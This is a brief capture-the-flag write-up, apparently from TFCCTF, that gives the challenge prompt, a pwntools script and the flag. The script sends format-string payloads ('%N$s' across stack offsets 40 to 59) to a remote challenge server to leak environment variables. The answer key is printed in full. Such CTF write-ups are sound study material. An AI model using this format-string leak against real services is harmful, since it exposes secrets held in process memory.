#### Challenge:

Everyone knows you can get env variables with getenv. That's why I don't give you a chance to use it!

---

#### Solution:

```python
from pwn import *
from struct import *


context.log_level = 'error'

for i in range(40, 60):
    try:
        r = remote('01.linux.challenges.ctf.thefewchosen.com', 59966)
        print(r.recvline().decode('utf-8').strip())
        r.sendline(b'%' + b'%d$s' % (i))
        print(r.recvline().decode('utf-8').strip())
        r.close()
    except:
        continue
```

---

<details><summary>FLAG:</summary>

```
TFCCTF{3v3ry0ne_f0rg3ts_char_*envp...}
```

</details>
<br/>
